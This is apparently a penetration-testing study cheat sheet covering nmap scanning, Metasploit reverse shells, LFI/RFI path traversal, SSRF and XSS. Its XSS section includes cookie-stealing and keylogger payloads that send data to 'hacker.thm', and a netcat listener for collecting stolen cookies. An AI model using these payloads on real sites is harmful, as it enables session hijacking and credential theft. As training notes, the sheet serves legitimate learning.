Reconnaissance :
 * NMAP scan :
    * TCP connect : `-sT` -> respond with RST or SYN/ACK. Bad with firewall (packets dropped)
    * SYN scan : `-sS` -> stealth, faster
    * NULL : `-sN` -> stealth, respond with RST if closed
    * FIN : `-sF` -> stealth, respond with RST if closed
    * XMAS : `-sX`-> stealth, respond with RST if closed
    * UDP : `-sU` -> open|filtered
    * ICMP : `-sn` -> network discovery
    * Firewall evasion : `-Pn` ->  not ping before scan
    * Firewall spot : `--badsum`-> if response it has firewall
    * Vuln scan : `nmap -Pn --script vuln` ou `-sV --script vulscan/vulscan.nse` ou `-sV --script nmap-vulners/` 
 * Exporter pour searchsploit : `nmap [...] -oX result.xml`
 * Gobuster :

Metasploit :
 * Chercher l'exploit -> mettre les options (RHOSTS, LHOST, LPORT) -> mettre un payload (windows/x64/shell/reverse_tcp) -> faire un reverse meterpreter (shell_to_meterpreter)
 Meterpreter :
   * Upload un fichier : `upload <path host>`
   * Avoir powershell : `load powershell` + `powershell_shell`
   

 SMB :
 * Enumerate share `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>`
 * Port : 139/445


 Searchsploit :
 * Chercher un titre : `searchsploit -t <titre>`
 * Importer les résultats de nmap : `searchsploit -x --nmap result.xml`

 Web exploring :
 * Robots.txt
 * Source code (comments, js)
 * Favicon to get framework (https://wiki.owasp.org/index.php/OWASP_favicon_database)
 * Subdomain : dnsrecon (dns bruteforce), Sublist3r, Certs (https://crt.sh)
 * Brute force a lot of things : ffuf & `/usr/share/seclists` lists
 * IDORs : chercher avec les IDs des comptes si on peut swap, et chercher les dev paths non référencés
 * LFI (local file inclusion) : 
   * when using get.php, function file_get_contents 
   * When using include in php code, we can use it to access other files. When seeing ?<function>=<path>.php, we can use the ../ attack
   * If adding some extension at the end (.php for ex) : use %00 or 0x00 (NULL BYTE) to cut off extension. Not working for PHP 5.3.4 and above
   * if filtering, can use "....//" instead of "../"
 * RFI (remote file inclusion) :
   * Need "allow_url_fopen" be on
   * Same as LFI
 * SSRF : Server-side Request Forgery
   * Full URL used, partial url or path of url
 * XSS :
   * Reflected : When putting XSS in the request, work when sending link to victim
   * Stored : stored in the web app
   * DOM based : Use DOM to attack
   * Blind : Same as stored but can't test it (ex : messages). Tool : https://github.com/mandatoryprogrammer/xsshunter-express
   * CheatSheet :
     * Session stealing : `fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));`
     * Key logger : `document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}`
     * When using in HTML : close tag and then put the script `<script>alert('THM');</script>`
     * With JS : Use `//` to comment the EOL and then execute the code
     * Polyglot XSS : all in one bypass filters/tags/attributes
     * To receive information : use netcat in attack machine `nc -nplv <port>`and then send payload like this `</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>`
     * https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
  * Command injection :
    * Cheatsheet : https://github.com/payloadbox/command-injection-payload-list
  * SQL injection :
    * 
 * Cloud environment : 
   * IP with sensitive environment : 169.254.169.254

 Hash :
  * Crackstation.com

Usefull tools :
 * https://pipedream.com


